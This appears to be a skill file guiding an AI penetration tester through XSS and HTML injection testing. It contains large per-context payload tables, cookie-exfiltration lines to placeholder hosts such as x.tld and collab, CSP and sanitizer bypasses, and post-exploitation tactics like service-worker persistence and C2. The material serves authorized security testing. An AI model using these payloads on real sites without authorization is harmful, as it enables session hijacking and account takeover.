---
name: xss
description: XSS and HTML injection testing covering reflected, stored, DOM-based, and normalization-dependent vectors
---

# XSS

Cross-site scripting persists because context, parser, and framework edges are complex. Treat every user-influenced string as untrusted until it is strictly encoded for the exact sink and guarded by runtime policy (CSP/Trusted Types).

## Attack Surface

**Types**
- Reflected, stored, and DOM-based XSS across web/mobile/desktop shells
- Scriptless HTML injection and second-order render paths

**Contexts**
- HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF

**Frameworks**
- React/Vue/Angular/Svelte sinks, template engines, SSR/ISR

**Defenses to Bypass**
- CSP/Trusted Types, DOMPurify, framework auto-escaping
- Decode, normalization, sanitization, and encoding order

## Injection Points

**Server Render**
- Templates (Jinja/EJS/Handlebars), SSR frameworks, email/PDF renderers

**Client Render**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, template literals
- `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`

**URL/DOM**
- `location.hash`/`search`, `document.referrer`, base href, `data-*` attributes

**Events/Handlers**
- `onerror`/`onload`/`onfocus`/`onclick` and `javascript:` URL handlers

**Cross-Context**
- postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB

**File/Metadata**
- Image/SVG/XML names and EXIF, office documents processed server/client

## Context Encoding Rules

- **HTML text**: encode `< > & " '`
- **Attribute value**: encode `" ' < > &` and ensure attribute quoted; avoid unquoted attributes
- **URL/JS URL**: encode and validate scheme (allowlist https/mailto/tel); disallow javascript/data
- **JS string**: escape quotes, backslashes, newlines; prefer `JSON.stringify`
- **CSS**: avoid injecting into style; sanitize property names/values; beware `url()` and `expression()`
- **SVG/MathML**: treat as active content; many tags execute via onload or animation events

## Key Vulnerabilities

### DOMPurify Live-Node Sanitization

Distinguish HTML-string input from live DOM objects sanitized with `IN_PLACE`. Resolve the deployed DOMPurify build and check relevant upstream advisories; a controlled observable `nodeName` is one live-node bypass mechanism. Trace same-origin foreign nodes or `adoptNode()` into this mode before selecting the bypass ([example advisory](https://github.com/cure53/DOMPurify/security/advisories/GHSA-x4vx-rjvf-j5p4)).

### Scriptless HTML Injection

Do not require JavaScript execution before you report HTML injection. Prove that the browser creates attacker-controlled markup and a concrete security effect.

Test base or form target changes, external requests, deceptive content, DOM clobbering through `id` or `name`, and dangling markup. Report XSS only when you prove a script-capable execution path. Do not dismiss HTML injection only because CSP blocks scripts.

### Unicode Normalization

Test normalization only when the target performs it. NFKC can fold fullwidth delimiters such as `＜` and `＞` into HTML syntax.

Map validation, normalization, sanitization, encoding, and parsing in order. Start with the harmless canary `＜h1 id="baz-nfkc"＞marker＜/h1＞`.

Report a bypass only when normalization creates dangerous syntax that reaches an unprotected sink. Load `semantic_confusion` when components interpret the value differently.

### Second-Order Rendering

Follow stored values into previews, administrative pages, email, exports, and hydration. Record which stage transforms and parses the value.

### DOM XSS

**Sources**
- `location.*` (hash/search), `document.referrer`, postMessage, storage, service worker messages

**Sinks**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, `document.write`
- `setAttribute`, `setTimeout`/`setInterval` with strings
- `eval`/`Function`, `new Worker` with blob URLs

**Vulnerable Pattern**
```javascript
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
```
Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`

### Mutation XSS

Leverage parser repairs to morph safe-looking markup into executable code (e.g., noscript, malformed tags):
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>
```

### Template Injection

Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates):
```
{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
```

### CSP Bypass

- Weak policies: missing nonces/hashes, wildcards, `data:` `blob:` allowed, inline events allowed
- Script gadgets: JSONP endpoints, libraries exposing function constructors
- Import maps or modulepreload lax policies
- Base tag injection to retarget relative script URLs
- Dynamic module import with allowed origins

### Trusted Types Bypass

- Custom policies returning unsanitized strings; abuse policy whitelists
- Sinks not covered by Trusted Types (CSS, URL handlers) and pivot via gadgets

## Payload Tables — per context

Pick by sink classification, not by preference. Each payload states what it
proves; `CANARY` marks where a per-test unique token goes so execution — not
reflection — is what you verify.

### HTML node (text context, tags not escaped)

| Payload | Notes |
|---|---|
| `<svg onload=alert(CANARY)>` | smallest reliable; no `<>` filtering evasion needed |
| `<img src=x onerror=alert(CANARY)>` | works where `svg` is stripped |
| `<details open ontoggle=alert(CANARY)>` | no `src` needed; survives some tag filters |
| `<iframe srcdoc="&lt;script&gt;alert(CANARY)&lt;/script&gt;">` | bypasses inner-HTML filtering of `<script>` |
| `<script>fetch('https://collab/'+document.cookie)</script>` | proof of exfil capability, use only where authorized |
| `<body onload=alert(CANARY)>` | when injection lands before `<body>` is closed |
| `<math><mtext><table><mglyph><style><!--</style><img title="--></mglyph><img src=1 onerror=alert(CANARY)>">` | mXSS — survives DOMPurify-class sanitizers via re-parsing |
| `<noscript><p title="</noscript><img src=x onerror=alert(CANARY)>">` | mXSS in noscript context |

### Attribute — quoted

| Payload | Notes |
|---|---|
| `" autofocus onfocus=alert(CANARY) x="` | fires without interaction on autofocus-able elements |
| `" onmouseover=alert(CANARY) x="` | needs a hover |
| `" onfocusin=alert(CANARY) autofocus x="` | `focusin` bubbles; reaches ancestors |
| `"><svg onload=alert(CANARY)>` | breaks out of the attribute into a node |
| `" onclick=alert(CANARY) x="` | needs a click |

### Attribute — unquoted or single-quoted

| Payload | Notes |
|---|---|
| `onmouseover=alert(CANARY) x=` | unquoted attr injection |
| `' onfocus='alert(CANARY)' autofocus x=' | single-quoted attr breakout |
| `/onerror=alert(CANARY)//` | where `/` acts as an attribute separator |

### JS string

| Payload | Notes |
|---|---|
| `"-alert(CANARY)-"` | classic arithmetic breakout |
| `";alert(CANARY)//"` | statement terminator |
| `</script><svg onload=alert(CANARY)>` | when the string is inside a `<script>` block — close the tag first |
| `\';alert(CANARY)//` | escaped-quote contexts |
| `$(alert(CANARY))` | jQuery-aware sinks that eval expressions |

### URL / scheme

| Payload | Notes |
|---|---|
| `javascript:alert(CANARY)` | href/src where the scheme is not allowlisted |
| `data:text/html,<script>alert(CANARY)</script>` | data URLs where allowed |
| `jav&#x09;ascript:alert(CANARY)` | tab entity breaks naive scheme filters |
| `javascript&colon;alert(CANARY)` | HTML entity in href — parsed at the browser layer |

### CSS

| Payload | Notes |
|---|---|
| `expression(alert(CANARY))` | legacy IE only — usually out of scope, say so |
| `</style><script>alert(CANARY)</script>` | style-block breakout, works everywhere |
| `background:url("javascript:alert(CANARY)")` | legacy |

### DOM sinks — the payload is in the source, not the reflection

| Sink | Payload |
|---|---|
| `innerHTML` / `outerHTML` | `<img src=x onerror=alert(CANARY)>` |
| `document.write` | `<svg><animate onbegin=alert(CANARY)>` |
| `eval` / `Function` | `alert(CANARY)` as the string |
| `location` / `window.open` | `javascript:alert(CANARY)` |
| `jQuery $(html)` | `<img src=x onerror=alert(CANARY)>` |
| `setTimeout(string)` | `alert(CANARY)` |

For DOM XSS the payload must survive to the sink: test with the browser, via
`browser evaluate_script`, and confirm the handler actually fired — a reflection
in the HTML source proves nothing if the sanitizer neutralised it before the sink.

### Framework notes that change the payload

| Framework | What changes |
|---|---|
| React | JSX escapes by default; look for `dangerouslySetInnerHTML`, `href={userInput}` |
| Angular | look for bypassing of the built-in sanitizer; `DomSanitizer.bypassSecurityTrust*` |
| Vue | `v-html` is the dangerous sink; attribute binding is safe |
| Svelte | `{@html ...}` is the dangerous sink |
| Markdown renderers | `javascript:` links and inline HTML pass-through vary by renderer version |

### CSP-aware payloads

When a CSP is present, payload choice follows the policy, not habit:

| CSP state | Path |
|---|---|
| `script-src 'unsafe-inline'` | everything above works |
| nonces present | steal the nonce from the page (`<script nonce=...>` in source), reuse it |
| `strict-dynamic` | inject a `<script>` that loads another script; the nonce propagates |
| `object-src 'none'` + no unsafe-inline | look for script gadgets in allowed frameworks (AngularJS templates) |
| `base-uri` unset | `<base href="https://evil/">` hijacks relative script loads |
| no `frame-ancestors` | clickjacking is a separate finding, not XSS |

AngularJS template injection where `angular` is on the page and CSP blocks
`unsafe-inline`:

```
{{constructor.constructor('alert(CANARY)')()}}
```

This is the standard CSP bypass path when the page loads AngularJS and CSP
blocks inline scripts but not eval (unsafe-eval allowed).

## Framework-Specific

### React

- Primary sink: `dangerouslySetInnerHTML`
- Secondary: setting event handlers or URLs from untrusted input
- Bypass patterns: unsanitized HTML through libraries; custom renderers using innerHTML

### Vue

- Sinks: `v-html` and dynamic attribute bindings
- SSR hydration mismatches can re-interpret content

### Angular

- Legacy expression injection (pre-1.6)
- `$sce` trust APIs misused to whitelist attacker content

### Svelte

- Sinks: `{@html}` and dynamic attributes

### Markdown/Richtext

- Renderers often allow HTML passthrough; plugins may re-enable raw HTML
- Sanitize post-render; forbid inline HTML or restrict to safe whitelist

## Special Contexts

### Email

- Most clients strip scripts but allow CSS/remote content
- Use CSS/URL tricks only if relevant; avoid assuming JS execution

### PDF and Docs

- PDF engines may execute JS in annotations or links
- Test `javascript:` in links and submit actions

### File Uploads

- SVG/HTML uploads served with `text/html` or `image/svg+xml` can execute inline
- Verify content-type and `Content-Disposition: attachment`
- Mixed MIME and sniffing bypasses; ensure `X-Content-Type-Options: nosniff`

## Post-Exploitation

- Session/token exfiltration: prefer fetch/XHR over image beacons for reliability
- Real-time control: WebSocket C2 with strict command set
- Persistence: service worker registration; localStorage/script gadget re-injection
- Impact: role hijack, CSRF chaining, internal port scan via fetch, credential phishing overlays

## Testing Methodology

1. **Identify sources** - URL/query/hash/referrer, postMessage, storage, WebSocket, server JSON
2. **Trace transformations and sinks** - Record decoding, normalization, sanitization, reparsing, and the final sink
3. **Classify context** - HTML node, attribute, URL, script block, event handler, JS eval-like, CSS, SVG
4. **Assess defenses** - Output encoding, sanitizer, CSP, Trusted Types, DOMPurify config
5. **Craft payloads** - Minimal payloads per context with encoding/whitespace/casing variants
6. **Multi-channel** - Test across REST, GraphQL, WebSocket, SSE, service workers

## Validation

1. Provide minimal payload and context (sink type) with before/after DOM or network evidence
2. Record the original and transformed value when decoding or normalization affects the result
3. Demonstrate cross-browser execution where relevant or explain parser-specific behavior
4. Show bypass of stated defenses (sanitizer settings, CSP/Trusted Types) with proof
5. Separate HTML injection from XSS and state the proven capability
6. Quantify impact beyond alert: data accessed, action performed, persistence achieved

## False Positives

- Reflected content safely encoded in the exact context
- CSP with nonces/hashes and no inline/event handlers
- Trusted Types enforced on sinks; DOMPurify in strict mode with URI allowlists
- Scriptable contexts disabled (no HTML pass-through, safe URL schemes enforced)
- The target does not perform the claimed normalization or decode
- A normalized value is safely encoded before the final sink

## Impact

- Session hijacking and credential theft
- Account takeover via token exfiltration
- CSRF chaining for state-changing actions
- Malware distribution and phishing
- Persistent compromise via service workers

## Pro Tips

1. Start with context classification, not payload brute force
2. Use DOM instrumentation to log sink usage; it reveals unexpected flows
3. Keep a small, curated payload set per context and iterate with encodings
4. Validate defenses by configuration inspection and negative tests
5. Prefer impact-driven PoCs (exfiltration, CSRF chain) over alert boxes
6. Treat SVG/MathML as first-class active content; test separately
7. Re-run tests under different transports and render paths (SSR vs CSR vs hydration)
8. Test CSP/Trusted Types as features: attempt to violate policy and record the violation reports

## Summary

Context, transformation order, and sink decide whether input becomes text, markup, or executable code. Prove HTML injection separately from XSS, and validate every render path. Encode for the exact context and verify at runtime with CSP/Trusted Types. Small payloads with strong evidence beat payload catalogs.
